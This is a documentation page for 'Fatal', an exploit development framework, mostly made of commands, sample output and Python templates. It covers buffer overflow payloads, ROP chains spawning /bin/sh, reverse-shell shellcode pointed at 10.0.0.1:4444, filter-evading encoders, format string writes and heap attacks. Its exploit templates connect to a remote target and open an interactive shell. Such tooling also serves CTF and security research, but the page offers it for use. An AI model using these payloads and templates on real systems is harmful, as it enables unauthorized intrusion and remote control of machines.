---
layout: page
title: Fatal - Exploit Framework
permalink: /tools/fatal/
---

# Fatal

**Object-oriented exploit development framework based on Baudrillard's "Fatal Strategies".**

<img src="https://img.shields.io/badge/category-exploitation-red?style=flat-square" alt="exploitation">
<img src="https://img.shields.io/badge/platform-linux%20%7C%20macos-green?style=flat-square" alt="platform">
<img src="https://img.shields.io/badge/python-3.10+-yellow?style=flat-square" alt="python">

---

## Overview

Fatal is an exploit development framework that inverts the traditional subject-object relationship. Instead of the attacker (subject) exploiting the target (object), Fatal models exploits as objects that "seduce" vulnerable systems into compromising themselves.

**Features:**
- Buffer overflow payload generation
- ROP chain builder
- Shellcode encoder/decoder
- Format string exploitation
- Heap exploitation primitives
- Cross-architecture support (x86, x64, ARM)

---

## Installation

```bash
# With baudrillard-suite
git clone https://github.com/bad-antics/baudrillard-suite.git
pip install pwntools capstone keystone-engine

# Standalone
pip install baudrillard-fatal
```

### Dependencies
- Python 3.10+
- pwntools
- capstone (disassembly)
- keystone (assembly)

---

## Quick Start

```bash
# Generate simple buffer overflow payload
python fatal/fatal.py --target vuln_binary --overflow --output payload.bin

# Build ROP chain
python fatal/fatal.py --binary vuln_binary --rop --gadgets

# Encode shellcode to evade filters
python fatal/fatal.py --encode shellcode.bin --encoder xor --output encoded.bin
```

---

## Exploit Development Workflow

### 1. Analysis

```bash
# Analyze binary for vulnerabilities
python fatal/fatal.py --analyze vuln_binary

=== BINARY ANALYSIS ===
File: vuln_binary
Arch: x86_64
OS: Linux

Protections:
  RELRO:    Partial
  Stack:    No canary
  NX:       Enabled
  PIE:      Disabled
  
Dangerous Functions:
  0x401156: strcpy (buffer overflow)
  0x4011a2: printf (format string)
  0x4011f8: gets (buffer overflow)
  
Interesting Gadgets: 847 found
```

### 2. Pattern Generation

```bash
# Generate cyclic pattern for offset finding
python fatal/fatal.py --pattern 500

# Find offset in crash
python fatal/fatal.py --pattern-offset 0x41416141
[*] Offset: 72 bytes
```

### 3. Payload Generation

```bash
# Buffer overflow with return address
python fatal/fatal.py --overflow \
    --offset 72 \
    --return-addr 0x401337 \
    --output payload.bin
```

---

## ROP Chain Building

### Gadget Discovery

```bash
python fatal/fatal.py --binary vuln_binary --rop --gadgets

=== ROP GADGETS ===

Stack pivots:
  0x401234: leave; ret
  0x401567: pop rsp; ret
  
Useful gadgets:
  0x401111: pop rdi; ret
  0x401222: pop rsi; pop r15; ret
  0x401333: pop rdx; ret
  0x401444: syscall; ret
  
Write primitives:
  0x401555: mov [rdi], rax; ret
```

### Automatic Chain Generation

```bash
# Generate execve("/bin/sh") chain
python fatal/fatal.py --binary vuln_binary --rop \
    --chain execve \
    --output rop_chain.bin

=== ROP CHAIN: execve("/bin/sh") ===

0x0000: 0x401111  # pop rdi; ret
0x0008: 0x402000  # ptr to "/bin/sh"
0x0010: 0x401222  # pop rsi; pop r15; ret
0x0018: 0x000000  # NULL (argv)
0x0020: 0x000000  # junk for r15
0x0028: 0x401333  # pop rdx; ret
0x0030: 0x000000  # NULL (envp)
0x0038: 0x401444  # syscall

Chain written to: rop_chain.bin (64 bytes)
```

### Custom Chain

```bash
# Define custom chain
python fatal/fatal.py --binary vuln_binary --rop --interactive

fatal> set rdi 0x402000
fatal> set rsi 0
fatal> set rax 59
fatal> syscall
fatal> generate
[*] Chain generated: 48 bytes
```

---

## Shellcode

### Generation

```bash
# Linux x64 reverse shell
python fatal/fatal.py --shellcode reverse_shell \
    --arch x64 \
    --os linux \
    --lhost 10.0.0.1 \
    --lport 4444 \
    --output shell.bin
    
[*] Generated: 74 bytes
[*] Bad chars: None
```

### Encoding

```bash
# XOR encode to avoid bad characters
python fatal/fatal.py --encode shell.bin \
    --encoder xor \
    --bad-chars "\x00\x0a\x0d" \
    --output encoded.bin

[*] Original: 74 bytes
[*] Encoded: 112 bytes
[*] Bad chars eliminated: \x00, \x0a, \x0d
```

### Encoders Available

| Encoder | Description | Size Increase |
|---------|-------------|---------------|
| xor | XOR with key | ~1.5x |
| alpha | Alphanumeric only | ~2x |
| unicode | Unicode-safe | ~2x |
| polymorphic | Self-modifying | ~3x |

---

## Format String Exploitation

```bash
# Analyze format string vulnerability
python fatal/fatal.py --format-string \
    --binary vuln_binary \
    --analyze

=== FORMAT STRING ANALYSIS ===

Stack offset to controlled input: 6
Stack layout at offset 6:
  %6$p  -> 0x4141414141414141 (our input)
  %7$p  -> 0x00007fff12345678
  %8$p  -> 0x0000000000401234

Write primitive available: Yes
```

### Write-What-Where

```bash
# Write value to address
python fatal/fatal.py --format-string \
    --write-addr 0x404040 \
    --write-value 0x401337 \
    --offset 6 \
    --output fmt_payload.txt
```

---

## Heap Exploitation

### House of Force

```bash
python fatal/fatal.py --heap house-of-force \
    --target-addr 0x404040 \
    --output heap_payload.bin
```

### Use After Free

```bash
python fatal/fatal.py --heap uaf \
    --analyze \
    --binary vuln_binary
```

---

## API Usage

```python
from baudrillard.fatal import Exploit, ROP, Shellcode

# Create exploit
exploit = Exploit("vuln_binary")

# Build payload
payload = b"A" * 72  # padding

# Add ROP chain
rop = ROP(exploit.binary)
rop.call("execve", ["/bin/sh", 0, 0])
payload += rop.chain()

# Or add shellcode (if NX disabled)
shellcode = Shellcode.reverse_shell("10.0.0.1", 4444)
payload += shellcode.encode(bad_chars=b"\x00")

# Send exploit
from pwn import remote
conn = remote("target", 1337)
conn.sendline(payload)
conn.interactive()
```

---

## Templates

### Basic Buffer Overflow

```python
from baudrillard.fatal import *

def exploit():
    # Connect
    target = remote("target.com", 1337)
    
    # Build payload
    payload = flat(
        b"A" * offset,
        p64(pop_rdi),
        p64(bin_sh_addr),
        p64(system_addr)
    )
    
    # Send
    target.sendline(payload)
    target.interactive()
```

### Format String

```python
from baudrillard.fatal import FormatString

def exploit():
    target = remote("target.com", 1337)
    
    # Build format string
    fmt = FormatString(offset=6)
    payload = fmt.write(got_printf, system_addr)
    
    target.sendline(payload)
    target.sendline("/bin/sh")
    target.interactive()
```

---

## Integration with Glitch

When Glitch finds a crash, Fatal can help develop an exploit:

```bash
# Analyze crash from Glitch
python fatal/fatal.py --from-crash crashes/crash_001/

=== CRASH ANALYSIS ===
Type: Stack buffer overflow
Control: EIP/RIP controlled
Offset: 72 bytes

Suggested exploitation:
  1. ROP chain (NX enabled)
  2. ret2libc
  
[*] Generating skeleton exploit...
[*] Written to: exploits/crash_001_exploit.py
```

---

## See Also

- [Glitch](/tools/glitch/) - For finding vulnerabilities to exploit
- [Perfect-Crime](/tools/perfect-crime/) - For payload delivery via steganography
